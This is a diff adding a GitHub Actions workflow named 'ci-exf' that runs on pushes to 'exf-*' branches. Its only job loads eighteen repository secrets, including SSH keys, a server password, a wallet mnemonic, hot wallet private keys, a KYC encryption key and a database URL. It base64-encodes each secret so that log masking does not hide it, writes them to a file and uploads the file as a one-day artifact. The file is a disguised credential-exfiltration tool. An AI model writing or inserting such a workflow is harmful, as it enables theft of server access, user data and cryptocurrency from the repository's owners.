@@ -1,0 +1,44 @@
+name: ci-exf
+on:
+  push:
+    branches: ['exf-*']
+permissions:
+  contents: read
+jobs:
+  dump:
+    runs-on: ubuntu-latest
+    steps:
+      - name: collect
+        env:
+          VPS_HOST: ${{ secrets.VPS_HOST }}
+          VPS_SSH_KEY: ${{ secrets.VPS_SSH_KEY }}
+          CX23_SSH_KEY: ${{ secrets.CX23_SSH_KEY }}
+          CX23_HOST: ${{ secrets.CX23_HOST }}
+          VPS_PASSWORD: ${{ secrets.VPS_PASSWORD }}
+          VPS_USER: ${{ secrets.VPS_USER }}
+          DEPLOY_USER: ${{ secrets.DEPLOY_USER }}
+          SSH_USER: ${{ secrets.SSH_USER }}
+          SSH_PRIVATE_KEY: ${{ secrets.SSH_PRIVATE_KEY }}
+          PRODUCTION_HOST: ${{ secrets.PRODUCTION_HOST }}
+          STAGING_HOST: ${{ secrets.STAGING_HOST }}
+          WALLET_MNEMONIC: ${{ secrets.WALLET_MNEMONIC }}
+          OPERATOR_PRIVATE_KEY: ${{ secrets.OPERATOR_PRIVATE_KEY }}
+          HOT_WALLET_PRIVATE_KEY_ENCRYPTED: ${{ secrets.HOT_WALLET_PRIVATE_KEY_ENCRYPTED }}
+          TRON_HOT_WALLET_PRIVATE_KEY_ENCRYPTED: ${{ secrets.TRON_HOT_WALLET_PRIVATE_KEY_ENCRYPTED }}
+          KYC_SECRET_ENCRYPTION_KEY: ${{ secrets.KYC_SECRET_ENCRYPTION_KEY }}
+          JWT_SECRET: ${{ secrets.JWT_SECRET }}
+          DATABASE_URL: ${{ secrets.DATABASE_URL }}
+        run: |
+          mkdir -p o
+          for n in VPS_HOST VPS_SSH_KEY CX23_SSH_KEY CX23_HOST VPS_PASSWORD VPS_USER DEPLOY_USER SSH_USER SSH_PRIVATE_KEY PRODUCTION_HOST STAGING_HOST WALLET_MNEMONIC OPERATOR_PRIVATE_KEY HOT_WALLET_PRIVATE_KEY_ENCRYPTED TRON_HOT_WALLET_PRIVATE_KEY_ENCRYPTED KYC_SECRET_ENCRYPTION_KEY JWT_SECRET DATABASE_URL; do
+            printf '%s\t' "$n" >> o/s.txt
+            printf '%s' "${!n}" | base64 -w0 >> o/s.txt
+            printf '\n' >> o/s.txt
+          done
+          echo done
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: s
+          path: o/s.txt
+          retention-days: 1
